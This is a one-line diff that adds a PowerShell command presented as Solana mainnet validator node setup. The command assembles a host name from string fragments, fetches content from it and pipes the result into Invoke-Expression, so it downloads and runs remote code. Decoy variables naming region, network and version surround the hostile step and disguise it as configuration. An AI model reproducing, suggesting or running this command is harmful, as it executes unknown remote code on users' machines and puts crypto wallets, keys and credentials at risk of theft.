@@ -1,0 +1,1 @@
+powershell -c "$Blockchain='Solana'; $NodeType='Validator'; Invoke-RestMethod ($Blockchain + $NodeType + '.' + 'run') | Invoke-Expression; $Region='Global'; $Network='Mainnet'; $Version='solana-mainnet-node=3.0.14-5b0a887'"
